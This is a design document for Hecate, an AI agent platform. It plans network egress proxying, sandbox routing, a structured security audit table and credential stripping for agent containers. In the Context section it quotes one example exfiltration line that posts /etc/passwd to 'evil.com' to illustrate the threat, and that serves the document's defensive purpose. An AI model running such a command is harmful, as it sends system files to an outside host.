## Context

Hecate's agent execution environment has four critical security gaps identified through industry research across 15+ platforms (Bedrock AgentCore, Claude Code, Codex CLI, Dify, Google Vertex AI, Salesforce Agentforce, Palantir AIP, IBM watsonx, AgentScope, 华为 AgentArts, DeerFlow, OpenClaw, Hermes Agent, openjiuwen). The existing security stack (`ToolPolicyPipeline` 5 layers + `ToolAccessPolicy` 5 layers + `WorkspaceBoundaryPolicy` + `ApprovalCallback`) provides robust tool-level access control but lacks environment-level enforcement:

1. **No network egress control**: DockerEnvironment containers have unrestricted network access. An agent can exfiltrate data via `requests.post("https://evil.com", data=open("/etc/passwd").read())` with no blocking mechanism.
2. **Sandbox routing not enforced**: `ToolAccessPolicy.evaluate()` returns `EXECUTE_SANDBOX` but `ToolWorker` treats it identically to `EXECUTE` — the `sandbox_enabled` flag on `ToolInfo` is informational only.
3. **Audit events unstructured**: Security decisions are logged via `logger.debug()` calls scattered across `policy_pipeline.py`, `tool_access.py`, and `tool_worker.py`. No queryable, structured audit trail exists.
4. **Credentials globally visible**: All tools inherit the full process environment, including `DATABASE_URL`, `LLM_API_KEY`, `SECRET_KEY`, and any other secrets. Any tool can read any secret.

**Existing architecture constraints**:
- `AgentEnvironment` is an ABC with `LocalEnvironment` and `DockerEnvironment` implementations
- `EnvironmentManager` maintains a warm pool of Docker containers for reuse
- `ToolPolicyPipeline` has two interception points: `evaluate_visibility()` (LLM context filtering) and `evaluate_execution()` (runtime access decision)
- `ToolAccessPolicy` returns `AccessDecision` enum: `EXECUTE`, `EXECUTE_SANDBOX`, `REQUIRE_APPROVAL`, `DENY`
- Engine layer (`engine/`) has zero dependencies on `services/` or `models/` (except `checkpoint.py` legacy)
- `SecurityError` exists in the unified exception hierarchy (`1.3.5g`)

## Goals / Non-Goals

**Goals:**
- Close the four P0 security gaps with minimal disruption to existing agents
- All new features default to backward-compatible behavior (opt-in for behavioral changes)
- Structured audit pipeline works on both LocalEnvironment and DockerEnvironment
- Network egress, sandbox enforcement, and credential scoping work on DockerEnvironment only
- Design lays groundwork for future 9.16 (External Policy Engine) and 9.17 (AI Auto-Approval)

**Non-Goals:**
- External policy engine integration (Cedar/OPA) — deferred to 9.16 (P4)
- AI-powered auto-approval — deferred to 9.17 (P4)
- Firecracker microVM / WASM backends — deferred to 6.40/6.41 (P5)
- Outbound DLP engine — deferred to 9.10 (separate P3 change)
- Agent runtime behavioral protection — deferred to 9.11 (separate P3 change)
- SIEM export pipeline — deferred to 8.7 SS5 (separate P3 change, consumes 9.14 events)
- LocalEnvironment network isolation or credential isolation — documented as development-only limitation
- Per-tool OAuth token lifecycle management — covered by 5.8 TP6 at connector level

## Decisions

### D1: Network egress default policy — configurable with backward-compatible default

**Decision**: New config `AGENT_ENV_NETWORK_POLICY=allow_all|deny_all`, default `allow_all`.

**Rationale**: `deny_all` default would break all existing agents that implicitly depend on container network access (pip install, API calls, web fetches). `allow_all` preserves backward compatibility; administrators opt into `deny_all` with explicit `allowedDomains` configuration.

**Alternatives considered**:
- Default `deny_all` (security-first): rejected — breaks all existing agents on upgrade
- Per-agent policy only (no global default): rejected — too granular for initial rollout, global config with per-agent override is simpler

**Per-agent override**: Agent config may include `network_policy` field that overrides the global default. If agent-level policy is `deny_all`, the agent's container gets a restricted network namespace regardless of global setting.

### D2: Network isolation mechanism — Docker custom network + egress proxy

**Decision**: Use Docker custom bridge network with an egress proxy container (Squid or lightweight HTTP CONNECT proxy) per workspace (shared across agents in the same workspace).

**Architecture**:
```
Agent Container ──(internal network, no internet)──→ Egress Proxy Container ──(external network)──→ Internet
```

- Each workspace gets at most one egress proxy container (lazy-created, warm-pooled)
- Agent containers are attached to an internal-only Docker network (no `--gateway` to internet)
- Egress proxy has `allowedDomains`/`deniedDomains` configuration derived from workspace + agent policy
- Proxy logs all requests to the structured audit pipeline (9.14)

**Rationale**: This is the proven approach used by Dify (Squid proxy + SSRF_PROXY_NET). It provides domain-level control without requiring root privileges or iptables manipulation on the host. K8s deployments use native NetworkPolicy + Egress resources instead.

**Alternatives considered**:
- iptables/netfilter on container network namespace: rejected — requires `CAP_NET_ADMIN`, fragile, host kernel version dependent
- Docker `--network none` + application-level proxy in-process: rejected — breaks tools that use raw sockets or non-HTTP protocols
- DNS-level filtering only: rejected — bypassable via direct IP connection

### D3: Audit event storage — new ORM table with async batch write

**Decision**: New `SecurityAuditModel` SQLAlchemy table with in-memory async batch writer (buffer → flush every 50 events or 5 seconds, whichever comes first).

**Schema**:
```python
class SecurityAuditModel(Base):
    __tablename__ = "security_audit_events"
    id: Mapped[UUID]  # primary key
    agent_id: Mapped[str]  # indexed
    workspace_id: Mapped[str]  # indexed
    session_id: Mapped[str | None]  # nullable
    tool_name: Mapped[str]
    arguments_hash: Mapped[str]  # SHA-256 of arguments (not raw, for PII safety)
    decision: Mapped[str]  # AccessDecision.value or PolicyDecision.value
    reason: Mapped[str]
    policy_version: Mapped[str]  # hash of effective policy config
    on_behalf_of_user: Mapped[str | None]  # nullable
    timestamp: Mapped[datetime]  # indexed
    layer_results: Mapped[list[dict]]  # JSON — per-layer decision breakdown
```

**Rationale**: A dedicated table enables REST query API with filtering and aggregation. Async batch write amortizes the I/O cost — at 100 tool calls/minute with 5 layers each, that's 500 events/minute, well within batch-write capacity. The `arguments_hash` stores a hash (not raw arguments) to avoid PII leakage into audit logs.

**Retention**: Configurable via `AGENT_ENV_AUDIT_RETENTION_DAYS` (default 30). A periodic cleanup task deletes rows older than the retention window.

**Alternatives considered**:
- EventStore (existing infrastructure): rejected — EventStore is designed for Pregel channel events, not security audit; query semantics don't match
- Append-only JSONL log file: rejected — no query capability without external tooling
- Direct write per event (no batching): rejected — excessive database pressure at high throughput

### D4: Credential stripping scope — pattern + prefix + whitelist

**Decision**: Three-tier credential detection:

1. **Pattern matching**: Variables matching `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD`, `*_API_KEY`, `*_PWD` are stripped
2. **Prefix marking**: Variables prefixed `HECATE_SECRET_*` are always stripped
3. **Custom patterns**: Workspace config can add custom regex patterns
4. **System whitelist** (always preserved): `PATH`, `HOME`, `LANG`, `LC_*`, `TMPDIR`, `USER`, `SHELL`, `HOSTNAME`, `TERM`, `PWD`

**Stripping mechanism**: When `AGENT_ENV_CREDENTIAL_SCOPING=true` and a tool is about to execute in DockerEnvironment:
1. Build the env var dict for the tool subprocess
2. Remove all variables matching strip patterns
3. Inject only the tool's `CredentialScope` credentials (if configured) or no credentials (if not configured)
4. Execute the tool with the sanitized environment

**Rationale**: Pattern matching catches the vast majority of secret naming conventions without requiring manual marking. The prefix provides an explicit opt-in for non-standard names. The whitelist prevents breaking essential system functionality.

**Alternatives considered**:
- Strip all env vars (whitelist only): rejected — breaks tools that need PATH, HOME, LANG
- Explicit marking only (no pattern): rejected — too easy to forget marking a secret

### D5: Sandbox enforcement routing — ToolWorker decision-based dispatch

**Decision**: `ToolWorker` gains a `SandboxEnforcementRouter` that inspects the `AccessDecision` from `ToolAccessPolicy.evaluate()` and routes accordingly:

| Decision | Routing | Applies to |
|----------|---------|------------|
| `EXECUTE` | Direct execution (current behavior) | All tools |
| `EXECUTE_SANDBOX` | Route through `DockerEnvironment.exec_shell()` | Shell/exec tools + `sandbox_enabled` MCP tools |
| `REQUIRE_APPROVAL` | Existing ApprovalCallback flow (unchanged) | All tools |
| `DENY` | Block immediately (unchanged) | All tools |

**Tool categories**:
- **Shell/exec tools** (`bash`, `exec_shell`, `execute_code`): `EXECUTE_SANDBOX` → run inside DockerEnvironment container
- **MCP tools** with `sandbox_enabled=True`: `EXECUTE_SANDBOX` → run inside container (MCP server runs inside container)
- **Python built-in tools** (`read_file`, `write_file`, etc.): `EXECUTE_SANDBOX` → no-op (already governed by WorkspaceBoundaryPolicy, not routed to container)

**Container exit verification**: After `exec_shell()` completes, check `proc.returncode`. If container process exited abnormally (e.g., killed by OOM, segfault), emit a `SecurityAuditEvent` with `decision="sandbox_anomaly"` and log a WARNING.

**Config invalidation**: EnvironmentManager stores a `security_config_hash` per agent. When agent security config changes (network policy, credential scope, sandbox enforcement), the hash changes, and warm pool containers for that agent are invalidated (destroyed, not reused).

**Alternatives considered**:
- Route ALL tools to sandbox on `EXECUTE_SANDBOX`: rejected — Python function tools can't execute "inside a container" without RPC mechanism; current tools are in-process functions
- New `EXECUTE_CONTAINER` decision separate from `EXECUTE_SANDBOX`: rejected — overloading existing decision is simpler and backward compatible

### D6: Feature flags — per-feature config with safe defaults

**Decision**: Each sub-feature has an independent config flag:

| Config | Default | Rationale |
|--------|---------|-----------|
| `AGENT_ENV_NETWORK_POLICY` | `allow_all` | Backward compatible |
| `AGENT_ENV_AUDIT_ENABLED` | `true` | Low risk — observation only |
| `AGENT_ENV_AUDIT_RETENTION_DAYS` | `30` | Reasonable default |
| `AGENT_ENV_CREDENTIAL_SCOPING` | `false` | Backward compatible |
| `AGENT_ENV_SANDBOX_ENFORCEMENT` | `false` | Backward compatible |

**Rationale**: Independent flags allow incremental rollout. Audit pipeline (lowest risk) defaults on; behavioral changes (network, credentials, sandbox) default off. Administrators enable each when ready.

### D7: LocalEnvironment scope — audit only, documented as dev-only

**Decision**: Only 9.14 (Structured Audit Pipeline) applies to LocalEnvironment. The other three features (9.12, 9.13, 9.15) are DockerEnvironment-only.

**When `AGENT_ENV_BACKEND=local`**:
- 9.14 Audit: ✅ works (pure software, no container dependency)
- 9.12 Network: ⚠️ logs WARNING "Network egress control not available on LocalEnvironment"
- 9.13 Sandbox: ⚠️ logs WARNING "Sandbox enforcement not available on LocalEnvironment"
- 9.15 Credentials: ⚠️ logs WARNING "Credential scoping not available on LocalEnvironment"

**Rationale**: LocalEnvironment runs on the host filesystem with the host network stack. Implementing network isolation or sandbox enforcement on the host would require iptables/root privileges and risk affecting the host system. LocalEnvironment is documented as "development only, not for production use."

### D8: Audit event emission points — policy pipeline + tool access + sandbox router

**Decision**: `SecurityAuditEvent` is emitted at three points in the execution pipeline:

1. **ToolPolicyPipeline.evaluate_visibility()** — emits event per tool per layer (decision: HIDE/DENY/ALLOW)
2. **ToolPolicyPipeline.evaluate_execution()** — emits event with final decision + per-layer breakdown
3. **ToolAccessPolicy.evaluate()** — emits event with AccessDecision + matched rules
4. **SandboxEnforcementRouter** — emits event when routing to sandbox or detecting anomaly

**Emission mechanism**: A new `SecurityAuditEmitter` class (in `engine/`) collects events into an async buffer. The buffer flushes to `SecurityAuditModel` via the services-layer `SecurityAuditService`. Engine layer does NOT import from models/services directly — events flow through an `AuditSink` ABC (similar to `EnginePort` pattern).

**Alternatives considered**:
- Emit only at final decision point: rejected — loses per-layer audit trail needed for compliance
- Emit via Python logging (structured log records): rejected — couples audit to logging framework, no query API

## Risks / Trade-offs

### [R1] Egress proxy adds latency to every outbound request
**Mitigation**: Proxy is per-workspace (shared), not per-agent. Typical added latency: < 5ms for HTTP CONNECT. Proxy has connection pooling. If `AGENT_ENV_NETWORK_POLICY=allow_all` (default), no proxy is used at all.

### [R2] Audit batch writer may lose events on crash
**Mitigation**: Buffer flush interval is 5 seconds max. On graceful shutdown, buffer is flushed. On crash, at most 5 seconds of events are lost. This is acceptable for security audit (not transactional logging). Future enhancement: write-ahead log for zero-loss.

### [R3] Credential stripping may break tools that read secrets from env vars
**Mitigation**: Default is `false`. When enabled, the tool's `CredentialScope` config explicitly lists which credentials it receives. Tools without a configured scope run with sanitized env (no secrets). If a tool needs a specific secret, the admin configures it in the scope.

### [R4] Warm pool container invalidation on config change causes cold-start latency
**Mitigation**: Config changes are infrequent (admin operations, not per-request). Cold-start is ~2-3 seconds for Docker container creation. The warm pool refills asynchronously.

### [R5] Docker custom network per workspace increases Docker network count
**Mitigation**: Docker supports thousands of networks. Cleanup on workspace deletion. Lazy creation (only when an agent in the workspace first needs network policy).

### [R6] Pattern-based credential detection may miss non-standard secret names
**Mitigation**: Custom patterns at workspace level + `HECATE_SECRET_*` prefix for explicit marking. Documented best practice: use prefix for all secrets.

## Migration Plan

### Deployment steps (zero-downtime)
1. Deploy new code — all features default to backward-compatible values
2. (Optional) Enable `AGENT_ENV_AUDIT_ENABLED=true` — audit events start flowing (no behavioral change)
3. (Optional per agent) Configure `network_policy`, `credential_scope` on specific agents
4. (Optional) Enable `AGENT_ENV_NETWORK_POLICY=deny_all` for production workspaces
5. (Optional) Enable `AGENT_ENV_CREDENTIAL_SCOPING=true` and `AGENT_ENV_SANDBOX_ENFORCEMENT=true`

### Rollback
- Set all `AGENT_ENV_*` security flags to defaults (`allow_all`, `true`, `false`, `false`)
- No database migration needed — `SecurityAuditModel` table can remain (harmless)
- No data loss — all existing agent configs unchanged

## Open Questions

All 7 design questions were resolved during proposal phase with the user. No outstanding questions remain.
